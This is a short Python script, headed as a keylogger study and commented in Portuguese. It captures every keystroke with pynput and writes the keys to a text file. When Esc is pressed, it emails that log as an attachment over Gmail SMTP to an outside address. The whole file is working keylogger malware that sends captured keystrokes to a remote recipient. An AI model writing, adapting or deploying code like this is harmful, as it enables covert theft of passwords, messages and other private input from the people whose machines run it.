#key logging app study

#Importar os módulos necessários
from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

word = ''

#Gravar as teclas em um arquivo txt
logging.basicConfig(filename='keys_logged.txt', format='%(asctime)s: %(message)s', level=logging.DEBUG)

#Os apertos serão gravados toda vez que a tecla enter for acionada
#Um pouco de formatação para melhorar a leitura
def on_press(key):
    global word
    if key != Key.enter:
        word += str(key)
    else:
        word = word.replace("'","")
        word = word.replace('Key.space',' ')
        logging.info(str(word))
        word = ''

#Tecla esc finaliza o programa e realiza a ultima gravação
def on_release(key):
    if key == Key.esc:
        logging.info(str(word))
        new_emailer()
        return False

#Envia o arquivo txt via email a cada X horas ou quando o programa é finalizado
def new_emailer():

    msg = MIMEMultipart()
    msg['Subject'] = "Keylogs"
    msg['From'] = "botmailbot01@gmail.com"
    msg['To'] = "send_to@email.com"

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open('keys_logged.txt', 'rb').read())
    encoders.encode_base64(part)

    part.add_header('Content-Disposition','attachment; filename="keys_logged.txt"')

    msg.attach(part)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    #Senhas e permissoes para o email que vai enviar as mensagens
    server.login("botmailbot01@gmail.com","password")
    #Enviar o email
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    #Desconectar do servidor
    server.quit()


#loop para que o script continue rodando e detectando os acionamentos do teclado
with Listener (on_press=on_press, on_release=on_release) as listener:
    listener.join()
